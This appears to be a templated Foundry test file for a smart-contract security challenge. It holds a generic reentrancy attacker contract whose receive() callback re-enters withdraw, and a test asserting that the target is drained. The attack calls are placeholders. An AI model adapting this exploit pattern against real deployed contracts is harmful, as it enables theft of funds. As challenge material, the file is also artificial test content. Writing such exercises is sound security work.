// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import "../challenges/{challenge_folder}/{main_contract}.sol";

contract {test_contract_name} is Test {{
    {target_contract} public target;
    ReentrancyAttacker public attacker;
    
    uint256 constant INITIAL_BALANCE = {initial_balance};

    function setUp() public {{
        target = new {target_contract}();
        vm.deal(address(target), INITIAL_BALANCE);
        attacker = new ReentrancyAttacker(address(target));
        vm.deal(address(attacker), 1 ether);
    }}

    function testExploit() public {{
        uint256 targetBalanceBefore = address(target).balance;
        
        attacker.attack{{value: 1 ether}}();
        
        assertEq(address(target).balance, 0, "Target should be drained");
        assertGt(address(attacker).balance, targetBalanceBefore, "Attacker should have funds");
    }}
}}

contract ReentrancyAttacker {{
    address public target;
    
    constructor(address _target) {{
        target = _target;
    }}
    
    function attack() external payable {{
        {deposit_call}
        {withdraw_call}
    }}
    
    receive() external payable {{
        if (address(target).balance > 0) {{
            {withdraw_call}
        }}
    }}
}}
